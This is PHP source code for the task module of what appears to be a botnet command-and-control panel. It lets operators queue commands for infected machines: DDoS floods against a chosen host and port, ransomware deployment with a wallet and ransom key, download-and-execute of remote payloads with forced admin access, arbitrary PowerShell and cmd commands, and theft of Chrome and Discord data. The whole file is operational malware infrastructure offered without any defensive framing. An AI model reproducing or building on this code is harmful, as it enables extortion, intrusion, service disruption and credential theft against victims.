<?php
class tasks
{
    //*TOKEN USER_TOKEN 	GROUP_TOKEN 	BOT_TOKEN 	TYPE 	ARG_ARRAY 	STATUS 	EXPIRE 	RUN_ONCE 	COUNT_EXEC 	CREATED 	
    private $table = "tasks";
    private $db;
    public function __construct()
    {
        global $db;
        $this->db = $db;
    }
    public function CheckToken($token)
    {
        $token = CleanInput($token);
        if (Checker1($this->table, "TOKEN", $token)) {
            return true;
        }
        return false;
    }
    public function GenerateToken()
    {
        $token = GenerateToken("TASK_");
        while ($this->CheckToken($token)) {
            $token = GenerateToken("TASK_");
        }
        return $token;
    }
    public function CheckType($inputType = "")
    {
        $types = array(
            "shutdown",
            "reboot",
            "setgroup",
            "ddos",
            "ransomware",
            "dlexec",
            "powershell",
            "cmd",
            "recovery",
            "sell",
            "close",
            "uninstall"
        );

        foreach ($types as $type) {
            if ($type === $inputType) {
                return true;
            }
        }

        return false;
    }

    public function Add($param = array(), $echo = true)
    {
        //*Protect param
        $param['USER_TOKEN'] = CleanInput($param['USER_TOKEN']);
        $param['GROUP_TOKEN'] = CleanInput($param['GROUP_TOKEN']);
        $param['TYPE'] = CleanInput($param['TYPE']);
        //$param['ARG_ARRAY'] = CleanInput($param['ARG_ARRAY']);
        $param['STATUS'] = CleanInput($param['STATUS']);
        $param['EXPIRE'] = CleanInput($param['EXPIRE']);
        $param['RUN_ONCE'] = CleanInput($param['RUN_ONCE']);
        $param['BOT_TOKEN'] = CleanInput(@$param['BOT_TOKEN']);
        // $param['COUNT_EXEC'] = CleanInput($param['COUNT_EXEC']);

        //*return value
        $return = array();
        $return['success'] = array();
        $return['error'] = array();
        $return['info'] = array();
        $return['warning'] = array();
        //*Check User
        global $user;
        if ($user->CheckLogin()) {
            $curr_data = $user->GetData($_SESSION['TOKEN']);
        } else {
            $return['error'][] = "You are not logged in";
        }
        if (empty($return['error'])) {
            if (empty($param['USER_TOKEN'])) {
                $return['error'][] = "User token is required";
            } else {
                if (!$user->CheckToken($param['USER_TOKEN'])) {
                    $return['error'][] = "User token is invalid";
                }
            }
            if (empty($param['GROUP_TOKEN'])) {

                if (empty($param['BOT_TOKEN'])) {
                    $return['error'][] = "Bot token is required";
                } else {
                    global $bots;
                    if (!$bots->CheckToken($param['BOT_TOKEN'])) {
                        $return['error'][] = "Bot token is invalid";
                    }
                }
            } else {
                global $group;
                if (!$group->CheckToken($param['GROUP_TOKEN'])) {
                    $return['error'][] = "Group token is invalid";
                } else {
                    if (!$group->CheckGroupWhereUser($param['GROUP_TOKEN'], $param['USER_TOKEN'])) {
                        $return['error'][] = "Group token is invalid";
                    }
                }
            }
            if (empty($param['TYPE'])) {
                $return['error'][] = "Type is required";
            } else {
                if (!$this->CheckType($param['TYPE'])) {
                    $return['error'][] = "Type is invalid";
                } else {
                    if ($param['TYPE'] == "shutdown") {
                        $param['ARG_ARRAY'] = array();
                        $param['ARG_ARRAY']['DATA'] = "NULL";
                    } else if ($param['TYPE'] == "reboot") {
                        $param['ARG_ARRAY'] = array();
                        $param['ARG_ARRAY']['DATA'] = "NULL";
                    } elseif ($param['TYPE'] == "ddos") {
                        //*cHECK DURATION
                        if (empty($param['ARG_ARRAY']['DURATION'])) {
                            $return['error'][] = "Duration is required";
                        } else {
                            if (!is_numeric($param['ARG_ARRAY']['DURATION'])) {
                                $return['error'][] = "Duration is invalid";
                            } else {
                                if ($param['ARG_ARRAY']['DURATION'] < 1) {
                                    $return['error'][] = "Duration is invalid";
                                } else {
                                    if ($param['ARG_ARRAY']['DURATION'] > 20000) {
                                        $return['error'][] = "Duration is invalid";
                                    }
                                }
                            }
                        }
                        //*cHECK HOST
                        if (empty($param['ARG_ARRAY']['HOST'])) {
                            $return['error'][] = "Host is required";
                        } else {
                            if (!filter_var($param['ARG_ARRAY']['HOST'], FILTER_VALIDATE_IP) && !filter_var($param['ARG_ARRAY']['HOST'], FILTER_VALIDATE_URL) && !filter_var($param['ARG_ARRAY']['HOST'], FILTER_VALIDATE_DOMAIN)) {
                                if (!filter_var($param['ARG_ARRAY']['HOST'], FILTER_VALIDATE_URL)) {
                                    $return['error'][] = "Host is invalid";
                                }
                            }
                        }
                        //*cHECK PORT
                        if (empty($param['ARG_ARRAY']['PORT'])) {
                            $return['error'][] = "Port is required";
                        } else {
                            if (!is_numeric($param['ARG_ARRAY']['PORT'])) {
                                $return['error'][] = "Port is invalid";
                            } else {
                                if ($param['ARG_ARRAY']['PORT'] < 1) {
                                    $return['error'][] = "Port is invalid";
                                } else {
                                    if ($param['ARG_ARRAY']['PORT'] > 65535) {
                                        $return['error'][] = "Port is invalid";
                                    }
                                }
                            }
                        }
                        //*cHECK METHOD
                        if (empty($param['ARG_ARRAY']['METHOD'])) {
                            $return['error'][] = "Method is required";
                        } else {
                            if (!in_array($param['ARG_ARRAY']['METHOD'], array("UDP", "TCP", "HTTP"))) {
                                $return['error'][] = "Method is invalid";
                            }
                        }
                    } elseif ($param['TYPE'] == "ransomware") {
                        if (empty($param['ARG_ARRAY'])) {
                            $return['error'][] = "Arg Array is required";
                        } else {
                            $param['ARG_ARRAY']["WALLET"] = CleanInput($param['ARG_ARRAY']["WALLET"]);
                            $param['ARG_ARRAY']["CONTACT"] = CleanInput($param['ARG_ARRAY']["CONTACT"]);
                            $param['ARG_ARRAY']["INFO"] =  CleanInput($param['ARG_ARRAY']["INFO"]);
                            $param['ARG_ARRAY']["KEY"] =  CleanInput($param['ARG_ARRAY']["KEY"]);
                            //*cHECK WALLET
                            if (empty($param['ARG_ARRAY']["WALLET"])) {
                                $return['error'][] = "Wallet is required";
                            }
                            //*cHECK CONTACT
                            if (empty($param['ARG_ARRAY']["CONTACT"])) {
                                $return['error'][] = "Contact is required";
                            }
                            //*cHECK INFO
                            if (empty($param['ARG_ARRAY']["INFO"])) {
                                $return['error'][] = "Info is required";
                            }
                            //*cHECK KEY
                            if (empty($param['ARG_ARRAY']["KEY"])) {
                                $return['error'][] = "Key is required";
                            } else {
                                if (strlen($param['ARG_ARRAY']["KEY"]) < 10) {
                                    $return['error'][] = "Key is invalid";
                                }
                            }
                        }
                    } elseif ($param['TYPE'] == "dlexec") {
                        if (empty($param['ARG_ARRAY'])) {
                            $return['error'][] = "Arg Array is required";
                        } else {
                            $param['ARG_ARRAY']["URL"] = CleanInput($param['ARG_ARRAY']["URL"]);
                            //*cHECK URL
                            if (empty($param['ARG_ARRAY']["URL"])) {
                                $return['error'][] = "URL is required";
                            } else {
                                if (!filter_var($param['ARG_ARRAY']["URL"], FILTER_VALIDATE_URL)) {
                                    $return['error'][] = "URL is invalid";
                                }
                            }
                            //*Check File Type
                            if (empty($param['ARG_ARRAY']["FILE_TYPE"])) {
                                $return['error'][] = "File Type is required";
                            } else {
                                if (!in_array($param['ARG_ARRAY']["FILE_TYPE"], array("EXE", "BAT", "CMD", "PS1", "VBS", "JS", "JSE", "WSF", "WSH", "HTA", "SCR", "COM", "PIF", "LNK", "MSI", "MSP", "CPL", "REG", "SCT", "DLL", "SYS", "OCX", "DRV", "AX", "ACM", "SCR", "CPL", "NLS", "TTF", "FON", "FOT", "FNT", "EOT", "OTF", "TTC", "WOFF", "WOFF2", "SVG", "SVGZ", "AI", "EPS", "PSD", "PDF", "PS", "CDR", "INDD", "PAGES", "XLS", "XLSX", "XLSM", "XLSB", "XLTX", "XLTM", "XLT", "XLAM", "XLA", "XLL", "XLW", "DOC", "DOCX", "DOCM", "DOTX", "DOTM", "DOT", "DOC", "ODT", "OTT", "RTF", "TXT", "CSV", "PPT", "PPTX", "PPTM", "POTX", "POTM", "POT", "PPAM", "PPA", "PPSX", "PPSM", "PPS", "ODP", "OTP", "KEY", "ODS", "XLS", "XLSX", "XLSM", "XLTX", "XLTM", "XLT", "XLAM", "XLA", "XLL", "XLW", "ODG", "OTG", "SVG", "SVGZ", "AI", "EPS", "PSD", "PDF", "PS", "CDR", "INDD", "PAGES", "XLS", "XLSX", "XLSM", "XLSB", "XLTX", "XLTM", "XLT", "XLAM", "XLA", "XLL", "XLW", "DOC", "DOCX", "DOCM", "DOTX", "DOTM", "DOT", "DOC", "ODT", "OTT", "RTF", "TXT", "CSV", "PPT", "PPTX", "PPTM", "POTX", "POTM", "POT", "PPAM", "PPA", "PPSX", "PPSM", "PPS", "ODP", "OTP", "KEY", "ODS", "XLS", "XLSX", "XLSM", "XLTX", "XLTM", "XLT", "XLAM", "XLA", "XLL", "XLW", "ODG", "OTG", "SVG", "SVGZ", "AI", "EPS", "PSD", "PDF", "PS", "CDR", "INDD", "PAGES", "XLS", "XLSX", "XLSM", "XLSB", "XLTX", "XLTM", "XLT", "XLAM", "XLA", "XLL", "XLW", "DOC", "DOCX", "DOCM", "DOTX", "DOTM", "DOT", "DOC", "ODT", "OTT", "RTF", "TXT", "CSV", "PPT", "PPTX", "PPTM", "POTX"))) {
                                    $return['error'][] = "File Type is invalid";
                                }
                            }
                            //*Check Access
                            if (empty($param['ARG_ARRAY']["ACCESS"])) {
                                $return['error'][] = "Access is required";
                            } else {
                                if ($param['ARG_ARRAY']["ACCESS"] == "NULL") {
                                    $return['error'][] = "Access is invalid";
                                } else {
                                    if ($param['ARG_ARRAY']["ACCESS"] == "user" or $param['ARG_ARRAY']["ACCESS"] == "admin" or $param['ARG_ARRAY']["ACCESS"] == "force") {
                                    } else {
                                        $return['error'][] = "Access is invalid";
                                    }
                                }
                            }
                        }
                    } elseif ($param['TYPE'] == "powershell") {
                        if (empty($param['ARG_ARRAY'])) {
                            $return['error'][] = "Arg Array is required";
                        } else {
                            $param['ARG_ARRAY']["COMMAND"] = CleanInput($param['ARG_ARRAY']["COMMAND"]);
                            //*cHECK COMMAND
                            if (empty($param['ARG_ARRAY']["COMMAND"])) {
                                $return['error'][] = "Command is required";
                            }
                            if (empty($param['ARG_ARRAY']["ACCESS"])) {
                                $return['error'][] = "access is required";
                            }else{
                                if ($param['ARG_ARRAY']["ACCESS"] == "NULL") {
                                    $return['error'][] = "Access is invalid";
                                } else {
                                    if ($param['ARG_ARRAY']["ACCESS"] == "user" or $param['ARG_ARRAY']["ACCESS"] == "admin" or $param['ARG_ARRAY']["ACCESS"] == "force") {
                                    } else {
                                        $return['error'][] = "Access is invalid";
                                    }
                                }
                            
                            }
                        }
                    } elseif ($param['TYPE'] == "cmd") {
                        if (empty($param['ARG_ARRAY'])) {
                            $return['error'][] = "Arg Array is required";
                        } else {
                            $param['ARG_ARRAY']["COMMAND"] = CleanInput($param['ARG_ARRAY']["COMMAND"]);
                            //*cHECK COMMAND
                            if (empty($param['ARG_ARRAY']["COMMAND"])) {
                                $return['error'][] = "Command is required";
                            }
                            if (empty($param['ARG_ARRAY']["ACCESS"])) {
                                $return['error'][] = "access is required";
                            }else{
                                if ($param['ARG_ARRAY']["ACCESS"] == "NULL") {
                                    $return['error'][] = "Access is invalid";
                                } else {
                                    if ($param['ARG_ARRAY']["ACCESS"] == "user" or $param['ARG_ARRAY']["ACCESS"] == "admin" or $param['ARG_ARRAY']["ACCESS"] == "force") {
                                    } else {
                                        $return['error'][] = "Access is invalid";
                                    }
                                }
                            
                            }
                        }
                    } elseif ($param['TYPE'] == "recovery") {
                        if (empty($param['ARG_ARRAY'])) {
                            $return['error'][] = "Arg Array is required";
                        } else {
                            $param['ARG_ARRAY']["TYPE"] = CleanInput($param['ARG_ARRAY']["TYPE"]);
                            //*cHECK TYPE
                            if (empty($param['ARG_ARRAY']["TYPE"])) {
                                $return['error'][] = "Type is required";
                            } else {
                                if (!in_array($param['ARG_ARRAY']["TYPE"], array("CHROME", "DISCORD"))) {
                                    $return['error'][] = "Type is invalid";
                                }
                            }
                        }
                    } elseif ($param['TYPE'] == "close") {
                        $param['ARG_ARRAY']['DATA'] = "NULL";
                    } elseif ($param['TYPE'] == "uninstall") {
                        $param['ARG_ARRAY']['DATA'] = "NULL";
                    }
                    if (empty($param['ARG_ARRAY'])) {
                        $return['error'][] = "Arg Array is required";
                    } else {
                        $param['ARG_ARRAY'] = json_encode($param['ARG_ARRAY']);
                    }
                }
            }
        }

        if (empty($param['STATUS'])) {
            $return['error'][] = "Status is required";
        } else {
            if ($param['STATUS'] == "true") {
                $final_status = "1";
            } else {
                $final_status = "0";
            }
        }

        if (empty($param['RUN_ONCE'])) {
            $return['error'][] = "Run Once is required";
        } else {
            if ($param['RUN_ONCE'] == "true") {
                $final_run_once = "1";
            } else {
                $final_run_once = "0";
            }
        }

        if (empty($param['EXPIRE'])) {
            $return['error'][] = "Expire is required";
        } else {
            if (!DateIsHourly($param['EXPIRE'])) {
                $return['error'][] = "Expire is invalid";
            } else {
                $final_expire = IsHourlyToTimestemp($param['EXPIRE']);
                if ($final_expire < time()) {
                    $return['error'][] = "Expire is invalid";
                }
            }
        }




        if (empty($return['error'])) {

            $SqlData = array();
            $SqlData[':TOKEN'] = $this->GenerateToken();
            $SqlData[':USER_TOKEN'] = $param['USER_TOKEN'];
            if (empty($param['GROUP_TOKEN'])) {
                $SqlData['GROUP_TOKEN'] = "0";
                if (empty($param['BOT_TOKEN'])) {
                    $SqlData['BOT_TOKEN'] = "0";
                } else {
                    $SqlData[':BOT_TOKEN'] = $param['BOT_TOKEN'];
                }
            } else {
                $SqlData[':GROUP_TOKEN'] = $param['GROUP_TOKEN'];
                $SqlData['BOT_TOKEN'] = "0";
            }


            $SqlData[':TYPE'] = $param['TYPE'];

            $SqlData[':ARG_ARRAY'] = json_encode($param['ARG_ARRAY'], true);
            $SqlData[':STATUS'] = $final_status;
            $SqlData[':EXPIRE'] = $final_expire;
            $SqlData[':RUN_ONCE'] = $final_run_once;
            $SqlData[':COUNT_EXEC'] = "0";
            $SqlData[':CREATED'] = time();


            $iDATA = $this->db->prepare("INSERT INTO `$this->table` VALUES(NULL,:TOKEN,:USER_TOKEN,:GROUP_TOKEN,:BOT_TOKEN,:TYPE,:ARG_ARRAY,:STATUS,:EXPIRE,:RUN_ONCE,:COUNT_EXEC,:CREATED)");
            $iDATA->execute($SqlData);
            $return['success'][] = "Task has been added";
        }
        global $msg;
        $msg->ShowArray($return, $echo);
        return $return;
    }
    public function GetTaskByUser($user_token = "")
    {
        global $user;
        if ($user->CheckToken($user_token)) {
            return GetDataArrayTableWhere1arg($this->table, "USER_TOKEN", $user_token);
        }
        return array();
    }
    public function GetTaskByGroup($group_token = "")
    {
        global $group;
        if ($group->CheckToken($group_token)) {
            return GetDataArrayTableWhere1arg($this->table, "GROUP_TOKEN", $group_token);
        }
        return array();
    }
    public function GetTaskByBot($bot_token = "")
    {
        global $bots;
        if ($bots->CheckToken($bot_token)) {
            return GetDataArrayTableWhere1arg($this->table, "BOT_TOKEN", $bot_token);
        }
        return array();
    }
    public function GetTaskByHWID($hwid = "")
    {
        global $bots;
        if ($bots->CheckHwid($hwid)) {
            return GetDataArrayTableWhere1arg($this->table, "HWID", $hwid);
        }
        return array();
    }
    public function DisableTask($task_token = "")
    {
        $task_token = CleanInput($task_token);
        if ($this->CheckToken($task_token)) {
            SqlUpdater1($this->table, "STATUS", "0", "TOKEN", $task_token);
            return true;
        }
        return false;
    }
}
